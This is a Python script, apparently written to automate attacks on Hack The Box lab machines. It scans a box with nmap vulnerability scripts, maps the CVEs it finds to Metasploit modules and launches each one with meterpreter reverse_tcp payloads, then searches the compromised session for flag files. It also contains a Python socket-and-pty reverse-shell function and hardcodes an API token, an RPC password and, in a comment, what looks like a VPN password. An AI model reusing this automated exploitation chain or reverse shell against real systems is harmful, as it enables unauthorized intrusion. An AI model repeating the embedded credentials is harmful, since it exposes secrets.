import os, json, argparse, requests, time, csv, re
import libtmux, htb, nmap
from box import Box
import pandas as pd
import cve_searchsploit as CS
import getsploit
import pyperclip
import pymetasploit3
from pymetasploit3 import *
from pymetasploit3.msfrpc import MsfRpcClient
import http.server
import socketserver
import sys,socket,pty
import sqlite3
import tensorflow as tf


api = htb.HTB('OwBnueBa1zprFdqbWRQnNiXpyr0T1lIkZFQrwGUK0xnjD4Rs3yQxuUEGlHec')
BASE_URL = 'https://www.hackthebox.eu/api'
listOfBoxes = []
cveList = []
exploitList = []
#print(a.get_machine(7))
#print(type(a.get_machine(7)))
#list = a.get_machine(7).get("ip")
#print(list)
#def parseArgs():
parser = argparse.ArgumentParser(description='What box do you want to pwn?')
parser.add_argument('--box', required=True)
parser.add_argument('--action', default="assign")
parser.add_argument('--init', default="no")
name = parser.parse_args()

def initBoxes():
    rawBoxes = api.get_machines()
    for rawBox in rawBoxes:
        listOfBoxes.append(Box(rawBox))

def initialSetup():
    # Connect to HTB VPN
    os.system("xfce4-terminal -e \'bash -c \"sudo openvpn /home/mnm/Documents/AutoPen/DonDada.ovpn; bash\"\'")
    time.sleep(10)
    # Load metasploit RPC client
    os.system("xfce4-terminal -e \'msfconsole -x \"load msgrpc Pass=1337hax0r\"\'")
    time.sleep(20)

def printAllBoxes():
    for box in listOfBoxes:
        print(box.__repr__())
    #print(all)
    #print(*all, sep='\n')

        #print(el)
        #print(el.get("name"))
        #print(el["ip"])

    #formatlist = str(a.get_machines()).strip('[]')
    #print(type(formatlist))
    #formatlist = formatlist.replace("'", "\"")
    #res = json.loads(formatlist)
    #print(res)
    #list = res.get("name")

def getBoxIP(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.ip)
            return box.ip

def getBoxID(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.id)
            return box.id

def getBoxOS(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.os)
            return box.os

def auth(path: str) -> str:
        """
        Helper function to generate an authenticated URL
        :params self: HTB object in use
        :params path: string containing path to query
        :returns: path to authenticated query
        """
        print("{}?api_token={}".format(path, api.api_key))
        return "{}?api_token={}".format(path, api.api_key)


def controlBox(name: str, action: str):
    mid = getBoxID(name)
    print(mid)
    r = requests.post(BASE_URL + auth('/vm/vip/{}/{}'.format(action, mid)), headers=api.headers).json()
    if r["success"] != 1:
        print("Error:" + (r["status"]))

def getCVEsFromNmap():
    cveList = []
    with open(name.box + ".nmap", newline='') as nmapfile:
        cves=[]
        lines = nmapfile.read().splitlines()
        for line in lines:
            cves = re.findall(r'CVE-\w+-\w+', line)
            for cve in cves:
                cveList.append(cve)
    return cveList

def searchExploits(cveList):
    exploitList = []
    print(cveList)
    for cve in cveList:
        print(cve)
        print(CS.edbid_from_cve(cve))
        for i in CS.edbid_from_cve(cve):
            os.system("searchsploit -p " + str(i))
            exploitList.append(pyperclip.paste())
            time.sleep(5)
    return exploitList

def runNmap():
    nm = nmap.PortScanner()
    nm.scan(hosts=getBoxIP(name), arguments='--script vuln,nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -oN ' + name.box + '.nmap -sC -sV -Pn')
    print(nm.csv())
    print(nm.command_line())
    with open(name.box + '_nmapOutput.csv', 'w') as f:
       print(nm.csv(), file=f)
    # with open('nmapOutput.csv', 'w', newline='') as file:
    #     writer = csv.writer(file)
    #     writer.writerows(nm.csv())

def getExploitsFromMsf():
    exploitList = []
    with open(name.box + ".exploits", newline='') as exploitsfile:
        exploits=[]
        lines = exploitsfile.read().splitlines()
        for line in lines:
            exploits = re.findall(r'(?:exploit|auxiliary)\/\w+\/\w+\/\w+', line)
            for exploit in exploits:
                if exploit != "exploit/windows/smb/ms17_010_eternalblue_win8":
                    print(exploit)
                    exploitList.append(exploit)
    return exploitList

def cleanTemporaryFiles():
    filePath = name.box + ".exploits"
    if os.path.exists(filePath):
        os.remove(filePath)

def HTTPServer():
    PORT = 8000
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()

def reverseShell():
    RHOST = name.box
    RPORT = 4242
    s=socket.socket()
    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")
    os.system("xfce4-terminal -e \'bash -c \"nc -lvp \" + RPORT + \'")


def exploitsDB():
    conn = sqlite3.connect('autopen.db')
    c = conn.cursor()

    # Create table
    c.execute('''CREATE TABLE exploits
                 (service text, exploit text)''')

    # Insert a row of data
    c.execute("INSERT INTO exploits VALUES ('vsftpd','windows/')")

    # Save (commit) the changes
    conn.commit()

    # We can also close the connection if we are done with it.
    # Just be sure any changes have been committed or they will be lost.
    conn.close()

def workflow():
    #Clean temporary files
    #cleanTemporaryFiles()
    #Run nmap on machine
    #runNmap()
    #Get CVEs
    cveList = getCVEsFromNmap()
    cveList = list(dict.fromkeys(cveList))
    print(cveList)
    #Search for exploits using searchsploit
    # exploitList = searchExploits(cveList)
    # print(exploitList)
    # Initialize msfconsole
    client = MsfRpcClient('1337hax0r', port=55552)
    #Search for exploits in msfconsole
    # for cve in cveList:
    #     os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
    #     time.sleep(15)
    #Extract them from file
    exploitList = getExploitsFromMsf()
    for exploit in exploitList:
        x = exploit.split("/")
        exploitType = x[0]
        if x[0] != "auxiliary":
            exploitName = exploit.replace(exploitType + "/", "")
            print(exploitName)
            #Select exploit
            exploit = client.modules.use(exploitType, exploitName)
            #Set target
            try:
                exploit['RHOSTS'] = getBoxIP(name)
            except KeyError:
                exploit['RHOST'] = getBoxIP(name)
            #Choose payload to use
            #print(exploit.targetpayloads())
            if getBoxOS(name) == "Windows":
                if exploitName in ["windows/smb/ms17_010_eternalblue", "windows/smb/smb_doublepulsar_rce"]:
                    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
                else:
                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
            elif getBoxOS(name) == "Linux":
                payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
            #Set our IP
            payload['LHOST'] = 'tun0'
            #Run the exploit
            exploit.execute(payload=payload)
            time.sleep(20)
    print(client.sessions.list)
    #Interact with the newly opened session
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    if getBoxOS(name) == "Windows":
        shell.write('getuid')
    elif getBoxOS(name) == "Linux":
        shell.write('whoami')
    shell.read()
    print(shell.run_with_output('pwd'))
    print(shell.run_with_output('search -f user.txt'))
    print(shell.run_with_output('search -f root.txt'))
    #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
    #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))

#parseArgs()
if name.init == "yes":
    initialSetup()
initBoxes()
#Switch to assign/remove box
if name.action == "assign":
    controlBox(name, "assign")
elif name.action == "remove":
    controlBox(name, "remove")
#printAllBoxes()
workflow()

# productList = []
# with open('nmapOutput.csv', newline='') as csvfile:
#     spamreader = csv.reader(csvfile, delimiter=';', quotechar='|')
#     for row in spamreader:
#         print(', '.join(row))
#         if(row and row[7]):
#             print(row[7])
#             print("\n")
#             productList.append(row[7])
# for i in productList:
#     print(i)
#CS.edbid_from_cve("CVE-2019-0708")
    # for line in csvfile:
    #        csvfile.write(line.replace(';', ','))
    # df = pd.read_csv(csvfile)
    # column = df['product']
    # print(column)
# #Start HTB VPN on a window
# window.rename_window('vpn')
# paneVpn = window.split_window(attach=True)
# paneVpn.send_keys('openvpn DonDada.ovpn')
# time.sleep(5)
#paneVpn.send_keys('Menime1212!')
#time.sleep(10)
#Add a new window for nmap
# windowsNmap = session.new_window(attach=True, window_name="nmap")
# paneNmap = windowsNmap.split_window(attach=True)
# paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
#Add a new window to search exploits in metasploit
# windowsNmap = session.new_window(attach=True, window_name="nmap")
# paneNmap = windowsNmap.split_window(attach=True)
# paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
#CS.update_db()
#os.system("xfce4-terminal -e \'bash -c \"sudo openvpn /home/mnm/Documents/AutoPen/DonDada.ovpn; bash\"\'")
#Open a terminal with tmux
# os.system("xfce4-terminal -e \'bash -c \"tmux new-session -s sisc; bash\"\'")
# time.sleep(1)
# server = libtmux.Server()
# session = server.find_where({ "session_name": "sisc" })
# window = session.attached_window
# window.rename_window('nmap')
# paneVpn = window.attached_pane
# time.sleep(10)
# paneVpn.send_keys("nmap --script vuln -sC -sV -Pn -oA " + name.box +" " + getBoxIP(name))
# if 'CVE' in line:
#     print(line)
#paneVpn.send_keys("")
# print(exploitList)
# for exploit in exploitList:
#     print(exploit)
# with open("exploits.txt", newline='') as exploitfile:
#     exploits=[]
#     lines = exploitfile.read().splitlines()
#     for line in lines:
#         print(line)
#         exploits = re.findall(r'exploits/\w+/w+/$\w+', line)
#         for exploit in exploits:
#             print(exploit)
#print(client.modules.exploits)
#Add a new window to search exploits in metasploit
# windowsMSF = session.new_window(attach=True, window_name="msf")
# paneMSF = windowsMSF.split_window(attach=True)
# paneMSF.send_keys("msfconsole")
# time.sleep(5)

#!!!!!!TODO: use msfrpc library to get a console to search for an exploit
# exploitToUse = ""
# for cve in cveList:
#     print(cve)
#     print(CS.edbid_from_cve(cve))
#     for i in CS.edbid_from_cve(cve):
#         paneMSF.send_keys("search" + str(i))
#         #print(pyperclip.paste())
#         exploitToUse = pyperclip.paste()
#         time.sleep(5)
# print(exploitToUse)
#paneMSF.send_keys("load msgrpc Pass=Km9EcHcp")
# print(exploit.required)
# print(exploit.runoptions)
# print(exploit.references)
# print(exploit.targets)
# print(exploit.targetpayloads())
# print(payload.required)
# print(payload.runoptions)
    #shell.run_shell_cmd_with_output('pwd')
    #exploit['DisablePayloadHandler'] = False
